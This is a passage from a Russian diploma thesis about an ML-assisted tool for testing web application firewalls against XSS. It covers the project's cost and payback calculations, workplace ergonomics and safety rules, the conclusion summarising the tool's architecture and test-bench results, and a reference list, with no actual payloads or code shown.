экономического расчета — обосновать целесообразность выделения ресурсов на разработку и поддержку инструмента, сравнив единовременные и регулярные затраты с величиной предотвращённых убытков. Исходные данные для расчёта взяты из статистики по ущербу от кибератак для компаний, использующих веб-приложения. Согласно отчет у   Вебмониторэкс , средний прямой ущерб от успешной XSS-атаки  оценить сложно, но штрафы для компаний за единичный случай могут доходить до 15 млн рублей, а за повторные до 500 млн рублей. Однако   в  эту сумму  не  включены затраты на расследование инцидента, компенсации пострадавшим пользователям и восстановление систем. Косвенные убытки, связанные с репутационным ущербом и потерей доверия клиентов, могут в несколько раз превышать прямые расходы. Затраты на разработку и внедрение инструмента тестирования, с учётом использования ML-генератора пейлоадов  приведены в таблице. № п / п Наименование работы Трудоемкость чел / час Стоимость чел / часа руб. Сумма, тыс, руб Анализ требований 30 500 15 Проектирование архитектуры 20 500 10 Приобретение лицензий на ПО и  WAF - - 200 Написание кода 300 500 150 Тестирование инструмента 50 500 25 Итого единовременные затраты 400 Источник: составлено автором Эксплуатационные затраты на поддержание инструмента (ежегодные) включают обновление базы полезных нагрузок и регулярное проведение тестов, а также поддержку и доработку инструмента, как указано в таблице . № п / п Наименование работы Трудоемкость чел / час Стоимость чел / часа руб. Сумма, тыс, руб Обновление базы полезных нагрузок 100 500 5 0 Техническая поддержка и доработка инструмента 150 500 75 Проведение тестов и анализ отчетов 150 500 75 Итого  годовые эксплуатационные затраты 200 Источник: составлено автором Расчет предотвращённых убытков .  Величина предотвращенного ущерба (∆У) рассчитывается как разница между потенциальным ущербом до и после внедрения: ∆У =  У 0 -  У 1 г де : У 0   -  потенциальный ущерб до внедрения ( 10  000 тыс. руб лей .),  У 1   -  прогнозируемый ущерб после внедрения ( 10 000×0.2= 20 00  тыс. рублей ). ΔУ= 10 000− 2 0 0 0= 80 00 тыс. руб лей Таким образом, ежегодно предотвращается убытков на  8  млн руб лей . Расчет срока окупаемости  T ок   : срок окупаемости проекта рассчитывается по формуле: T ок =  R ∆У-ЭЗ г де :   R  - единовременные затраты ( 400  тыс. руб лей ), ∆У  -   величина предотвращенного ущерба в год ( 8000  тыс. руб лей ), ЭЗ - годовые эксплуатационные затраты (2 00  тыс. руб лей ). T ок =  400 8000 - 200 ≈0 ,0 51   года Переведем в месяцы:  0,0 51 *12≈ 0,6  месяц а Расчет чистого дисконтированного дохода (ЧДД) за 3 года: д ля более точной оценки учтем дисконтирование денежных потоков при ставке 10% (r=0,1). ЧДД=- R + t=1 3 (∆У-ЭЗ) (1+ r) t ЧДД=- 400 + 7800 1,1 + 7800 1,1 2 + 7800 1,1 3 ≈1 8997  тыс. руб лей Проведённый расчет демонстрирует высокую экономическую эффективность проекта. Единовременные затраты в размере  400 тыс. рублей  окупаются менее чем за месяц. Чистый дисконтированный доход за трёхлетний  период эксплуатации инструмента  почти 19   млн .  рублей, что значительно превосходит первоначальные вложения. Разработка и внедрение инструмента для тестирования WAF с использованием машинного обучения является не только технически обоснованным, но и высокорентабельным решением, существенно снижающим риски финансовых потерь от XSS-атак. БЕЗОПАСНОСТЬ ЖИЗНЕДЕЯТЕЛЬНОСТИ Охрана труда при работе с персональным компьютером Разработка программного инструментария для тестирования межсетевых экранов WAF на устойчивость к XSS-атакам относится к категории интеллектуального труда, связанного с высокой напряжённостью и длительным пребыванием сотрудников за персональными компьютерами. В соответствии с Трудовым кодексом РФ и санитарными правилами СанПиН 2.2.2/2.4.3359-16 «Санитарно-эпидемиологические требования к физическим факторам на рабочих местах», условия труда должны обеспечивать сохранение здоровья и работоспособности сотрудника. Это включает в себя создание безопасных условий для работы, что является обязанностью работодателя и напрямую влияет на качество и результативность труда. Система охраны труда в России регламентируется рядом нормативных актов и документов, регулирующих физические и организационные условия на рабочих местах, а также способы минимизации рисков для здоровья работников : Конституция РФ .  Основной закон страны, который регулирует права и обязанности граждан, в том числе в области охраны труда. Гражданский кодекс РФ (часть 1 и 2) .   Определяет правовые основы взаимоотношений между работодателями и работниками, включая вопросы трудового договора и трудовых отношений. Трудовой кодекс РФ .   Регламентирует трудовые отношения, включая права работников, их безопасность и защиту на рабочих местах. Законы и постановления Совета Федерации, Государственной Думы, Правительства РФ .  Также включают в себя решения и постановления федеральных органов исполнительной власти, регулирующих сферу охраны труда. Нормативно-техническая документация (ССБТ, нормы, инструкции) Особенности охраны труда для определённых категорий работников Система стандартов безопасности труда (ССБТ) включает в себя требования, нормы и правила, направленные на обеспечение безопасности и сохранение здоровья сотрудников в процессе их трудовой деятельности. В соответствии с ГОСТ 12.0.001-2013 выделяются пять основных групп стандартов, регулирующих безопасность труда: Организационно-методические стандарты. Стандарты, устанавливающие требования и нормы для различных видов опасных и вредных производственных факторов. Стандарты, определяющие требования безопасности для производственного оборудования и машин. Стандарты, регулирующие требования безопасности в производственных процессах. Стандарты, предъявляющие требования к средствам индивидуальной и коллективной защиты. В процессе разработки и эксплуатации инструмента для тестирования WAF, работник может столкнуться с рядом вредных и опасных факторов. Рассмотрим их подробнее. Физические факторы: Электромагнитные и электростатические поля: Рабочие места, связанные с длительным использованием мониторов и системных блоков, могут генерировать повышенные уровни электромагнитных и электростатических полей, что может негативно влиять на здоровье сотрудников. Недостаточная или чрезмерная освещенность рабочего места: Неправильная организация освещения может привести к напряжению зрительного анализатора, что вызывает усталость глаз и головные боли. Шум от системы охлаждения: Наличие шума, исходящего от системы охлаждения компьютера, может создавать дополнительный дискомфорт и воздействовать на концентрацию внимания. Факторы трудового процесса: Напряжение зрения и внимания: Разработка и тестирование инструментов для защиты от XSS требуют долгих часов, проведённых за монитором, с постоянным анализом кода, логов WAF и написанием скриптов. Это создаёт дополнительную нагрузку на зрение и внимание. Интеллектуальная и эмоциональная нагрузка: Решение нестандартных задач, связанных с тестированием и анализом защищённости веб-приложений, а также необходимость постоянного обучения для поддержания актуальности знаний по новым угрозам и методам защиты, влекут за собой значительные интеллектуальные и эмоциональные нагрузки. Статические нагрузки на мышцы: Длительное времяпрепровождение за компьютером вызывает напряжение мышц шеи, плечевого пояса, спины и кистей рук, что увеличивает риск развития туннельного синдрома и других заболеваний, связанных с длительным пребыванием в одном положении. Монотонность труда: Повторяющиеся операции, такие как тестирование различных сценариев на XSS-уязвимости, могут привести к снижению мотивации и повышению монотонности работы. Меры по снижению рисков Для минимизации негативных последствий для здоровья при длительной работе с компьютером необходимо соблюдать следующие рекомендации: Организация правильной позы:  с тулья и столы должны быть настроены так, чтобы человек мог работать, не напрягая спину и шею. Регулярные перерывы для разминки помогают снять напряжение с мышц. Освещённость рабочего места: Рабочее место должно быть оборудовано комфортным освещением, которое предотвращает нагрузку на глаза. Рекомендуется использовать мягкое фоновое освещение, чтобы избежать резких контрастов на экране. Использование эргономичных устройств:  д ля предотвращения туннельного синдрома и других заболеваний необходимо использовать эргономичные клавиатуры и мыши, а также оборудовать рабочее место с подставками для запястий и поддержкой для спины. Ментальное здоровье и обучение:  д ля снижения интеллектуальной нагрузки важно организовать режим работы с регулярными перерывами и поддержкой психологического климата в коллективе. Рекомендуется обучение и тренировки, чтобы снизить стресс и повысить продуктивность. Применение этих мер поможет поддерживать здоровье и работоспособность сотрудников, обеспечив безопасность и высокую эффективность разработки и эксплуатации инструментов для тестирования WAF . Охрана труда при работе с персональным компьютером Разработка программного инструмента для тестирования межсетевых экранов WAF на устойчивость к XSS-атакам связана с интеллектуальным трудом, который требует длительного пребывания сотрудников за персональным компьютером. Согласно Трудовому кодексу РФ и санитарным правилам СанПиН 2.2.2/2.4.3359-16, условия труда должны обеспечивать сохранение здоровья и работоспособности сотрудников. Это включает создание безопасных рабочих мест, что влияет на качество труда. Рабочее место должно быть спроектировано с учётом антропометрических данных пользователя для обеспечения физиологически правильной рабочей позы. Регулируемое кресло должно обеспечивать поддержку шеи и поясницы, а также возможность регулировки по высоте, чтобы угол между бедром и голенью составлял 90-100°. Расстояние от глаз до экрана должно составлять 60-70 см, угол наклона монитора — 15-20°. Уровень освещённости на рабочем месте должен быть 300-500 лк.   Для снижения зрительного утомления обязательны перерывы каждые 45-50 минут, а также выполнение гимнастики для глаз. Защита от электромагнитных полей Для снижения воздействия электромагнитных и электростатических полей следует использовать современные ЖК-мониторы с низким уровнем излучения, а также обеспечить заземление рабочего места и использование антистатических ковриков. Ответственность за нарушение трудового законодательства Ответственность за нарушение трудового законодательства может быть административной (ст. 5.27.1 КоАП РФ) или уголовной (ст. 143 УК РФ), в случае тяжёлых последствий для здоровья работников. Создание безопасных условий труда для разработчиков является не только юридической обязанностью работодателя, но и ключевым фактором повышения продуктивности и долгосрочной лояльности сотрудников. Соблюдение эргономических и санитарно-гигиенических норм позволяет минимизировать профессиональные риски, такие как синдром компьютерного зрения и туннельный синдром, что способствует стабильной и эффективной работе IT-подразделения. Разработанный в рамках дипломного проекта инструмент учитывает все эти требования, что гарантирует его безопасность при эксплуатации. ЗАКЛЮЧЕНИЕ В рамках данного дипломного проекта была достигнута основная цель — спроектирован и реализован специализированный программный инструментарий для комплексной оценки устойчивости межсетевых экранов веб-приложений (WAF) к атакам типа XSS. Разработанное решение позволяет автоматизировать процесс тестирования систем защиты, предоставляя количественные метрики их эффективности и выявляя уязвимости в конфигурации безопасности. Основной  отличием инструмента от существующих решений  является использование машинного обучения (ML) для генерации адаптируемых и уникальных пейлоадов, что значительно улучшает точность и гибкость тестирования. В ходе работы были последовательно решены все поставленные задачи, что подтверждается следующими результатами: Проведен анализ современных видов XSS-атак и методов их детектирования. В исследовательской части была систематизирована эволюция атак XSS, рассмотрены их современные разновидности (отражённые, хранимые, DOM-ориентированные), классифицированные по типу взаимодействия с веб-приложением и методам обхода защиты. Глубокий анализ механизмов работы WAF, включая сигнатурные и поведенческие модели, позволил выявить ключевые принципы, на которых основываются современные системы обнаружения и блокировки угроз. Исследованы существующие техники обхода межсетевого экрана WAF. Изучены методы обхода защиты, включая синтаксическую и семантическую обфускацию, манипуляции с параметрами URL, кодирование, использование нестандартных символов и экранирование. Эти исследования позволили сформировать требования к генератору тестовых нагрузок, способному имитировать тактики реального  противника, включая применение машинного обучения для создания адаптивных атак. Проанализированы аналогичные инструменты. Проведенный сравнительный обзор инструментов, таких как Burp Suite, OWASP ZAP и XSSer, показал наличие существенного пробела в области специализированных решений, ориентированных именно на оценку эффективности WAF по защите от XSS-атак. Выявлено, что существующие инструменты либо решают узкоспециализированные задачи, либо нацелены на успешное проникновение, но не предоставляют комплексной метрики устойчивости защиты. Разработана архитектура инструмента для тестирования WAF на устойчивость к XSS-атакам, включающая модуль генерации тестовых полезных нагрузок, модуль отправки HTTP-запросов и анализа ответов межсетевого экрана WAF. Спроектированная модульная архитектура обеспечивает гибкость и масштабируемость, включая центральный координатор, систему генерации и обфускации полезных нагрузок, детектор WAF и генератор отчетов. Такая структура позволяет легко добавлять новые типы атак и настраивать инструмент под специфические требования. Реализован прототип инструмента на языке программирования Python. Практическая реализация подтвердила жизнеспособность предложенной архитектуры. Инструмент интегрирует в себе базу данных с тысячами шаблонов XSS-пейлоадов и движок обфускации, использующий различные техники для создания завуалированных нагрузок, направленных на обход стандартных сигнатур. Встроенные механизмы многопоточности повышают производительность тестирования, а детализированный анализ ответов WAF позволяет классифицировать результаты. Проведено экспериментальное тестирование инструмента. Прототип был проверен на тестовом стенде с уязвимым веб-приложением, защищённым  WAF на основе ModSecurity с правилами OWASP CRS. В ходе тестирования, инструмент продемонстрировал свою работоспособность, корректно идентифицировал WAF, оценил его общую эффективность и детализировал результаты по категориям атак. Определен экономический эффект от внедрения инструмента. Расчёт экономической эффективности показал, что единовременные затраты на разработку инструмента окупаются менее чем за месяц благодаря предотвращению убытков от успешных атак. Чистый дисконтированный доход за трёхлетний период эксплуатации оценивается в  19  млн рублей, что значительно превышает первоначальные вложения, что свидетельствует о высокой рентабельности проекта. Рассмотрены вопросы безопасности жизнедеятельности. Были проанализированы вредные и опасные факторы, сопровождающие труд программиста, и предложены мероприятия по организации безопасного и эргономичного рабочего места в соответствии с действующими нормами Трудового кодекса РФ и санитарными правилами. Таким образом, представленный дипломный проект является законченным научно-практическим исследованием, завершившимся созданием полнофункционального программного продукта. Разработанный инструмент для тестирования WAF на устойчивость к XSS-атакам заполняет существующий пробел на рынке, предлагая специалистам по информационной безопасности эффективное средство для аудита, настройки и регулярного мониторинга систем защиты веб-приложений от одной из наиболее распространённых и критичных угроз. Дальнейшее развитие проекта может включать расширение базы тестовых нагрузок для других типов атак (например, RCE, XXE), интеграцию с CI/CD системами и реализацию более сложных сценариев тестирования. СПИСОК ИСПОЛЬЗОВАННЫХ ИСТОЧНИКОВ Веб-атаки на российские компании в 1 полугодии 2025 года  [ Электронный ресурс ]:  Вебмониторэкс   URL :  https://webmo n itorx.ru/wp-content/uploads/analytical-report.pdf  ( дата обращения: 01.10.2025).   Ff Федеральный закон от 27 июля 2006 г.  №  149-ФЗ  « Об информации, информационных технологиях и о защите информации »  [ Электронный ресурс ]:  Система Гарант  URL :  https://base.garant.ru/12148555/  ( дата обращения :  01.10.2025) Федеральный закон от 27 июля 2006 г.  №  152-ФЗ  « О   персональных данных »  [ Электронный ресурс ]:  Система Гарант  URL :  https://base.garant.ru/12148567/   (дата обращения :  01.10.2025) Федеральный закон от 26 июля 2017 г.  №  187-ФЗ  « О безопасности критической информационной инфраструктуры Российской Федерации »  [ Электронный ресурс ]:  Система Гарант  URL :    https://base.garant.ru/71730198/  (дата обращения :  01.10.2025) Приказ Федеральной службы по техническому и экспортному контролю от 11 февраля 2013 г.  №  17  « Об утверждении Требований о защите информации, не составляющей государственную тайну, содержащейся в государственных информационных системах »   [ Электронный ресурс ]:  Система Гарант  URL :   https://base.garant.ru/70391358/  (дата обращения :  03.10.2025) Приказ Федеральной службы по техническому и экспортному контролю от 18 февраля 2013 г.  №  21  « Об утверждении Состава и содержания организационных и технических мер по обеспечению безопасности персональных данных при их обработке в информационных системах персональных данных »  [ Электронный ресурс ]:  Система Гарант  URL :   https://base.garant.ru/70380924/   (дата обращения :  03.10.2025) Приказ Федеральной службы по техническому и экспортному контролю от 25 декабря 2017 г.  №  239  « Об утверждении Требований по обеспечению безопасности значимых объектов критической информационной инфраструктуры Российской Федерации »  [ Электронный ресурс ]:  Система Гарант  URL :   https://base.garant.ru/71901880/  (дата обращения: 03.10.2025) Межсетевой экран в соответствии с требованиями ФСТЭК России   [ Электронный ресурс ]:  ГК «Солар»   URL :   https://rt-solar.ru/products/solar_ngfw/blog/3472/    (дата обращения: 03.10.2025)  Безопасность финансовых (банковских) операций. Защита информации финансовых организаций. Базовый состав организационных и технических мер. ГОСТ  Р  57580.1-2017   [ Электронный ресурс ]:  СБК Контур   URL :   https://normativ.kontur.ru/document?moduleId=9&documentId=359206#l0  (дата обращения: 03.10.2025) Безопасность финансовых (банковских) операций. Защита информации финансовых организаций. Методика оценки соответствия. ГОСТ  Р  57580.2-2018   [ Электронный ресурс ]:  СБК Контур  URL :   https://normativ.kontur.ru/document?moduleId=9&documentId=397743  (дата обращения: 03.10.2025) OWASP Application Security Verification Standard (ASVS)  [ Электронный   ресурс ]:  OWASP Foundation   URL :  https://owasp.org/www-project-application-security-verification-standard/   ( дата   обращения : 03.10.2025) OWASP Top Ten   [ Электронный   ресурс ]:  OWASP Foundation   URL :   https://owasp.org/www-project-top-ten/   ( дата   обращения : 03.10.2025) Web Application Firewall Network Security Models And Configuration  [ Электронный   ресурс ] :  MS.Codes - Genuine Product Key   URL:   https://ms.codes/blogs/internet-security/web-application-firewall-network-security-models-and-configuration